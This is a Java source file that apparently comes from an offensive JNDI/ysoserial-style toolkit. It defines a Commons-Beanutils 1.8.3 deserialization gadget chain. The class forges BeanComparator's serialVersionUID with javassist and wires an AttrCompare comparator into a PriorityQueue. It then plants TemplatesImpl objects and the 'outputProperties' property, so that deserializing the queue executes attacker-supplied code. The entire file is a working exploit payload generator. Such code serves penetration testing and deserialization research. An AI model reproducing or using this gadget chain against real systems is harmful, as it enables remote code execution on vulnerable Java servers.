package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.SuClassLoader;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import java.util.Comparator;
import java.util.PriorityQueue;

import static com.qi4l.jndi.Starter.JYsoMode;
import static com.qi4l.jndi.Starter.cmdLine;

@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"SummerSec"})
public class CommonsBeanutilsAttrCompare183 implements ObjectPayload<Object> {
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object template;
        if (JYsoMode.contains("yso")) {
            template = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            template = Gadgets.createTemplatesImpl(type, param);
        }
        AttrNSImpl       attrNS1      = new AttrNSImpl();
        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
        attrNS1.setValues(coreDocument, "1", "1", "1");

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        } catch (javassist.NotFoundException e) {
        }
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();

        ctBeanComparator.defrost();

        Reflections.setFieldValue(beanComparator, "comparator", new AttrCompare());
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);

        queue.add(attrNS1);
        queue.add(attrNS1);

        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return queue;
    }
}
